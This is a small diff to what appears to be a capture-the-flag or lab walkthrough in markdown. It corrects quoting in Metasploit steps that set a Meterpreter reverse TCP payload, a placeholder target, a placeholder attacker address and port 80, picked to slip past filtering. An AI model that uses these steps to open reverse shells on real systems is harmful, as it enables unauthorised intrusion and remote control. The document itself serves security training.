@@ -346,9 +346,9 @@ Looking at this file using the cat command, we can see that it contains a long h
 * Set the payload, your choice. We used the meterpreter reverse tcp shell
     * `set payload windows/x64/meterpreter/reverse_tcp`
 * Set the target
-    * `set RHOSTS `"TARGET"
+    * `set RHOSTS 'TARGET'`
 * Set the attackers address
-    * `set LHOST `"Attacker Address"
+    * `set LHOST 'Attacker Address'`
 * Set the port to attack from, we use 80 because it is least likely to be blocked because of http traffic.
     * `set LPORT 80`
 * Run the attack
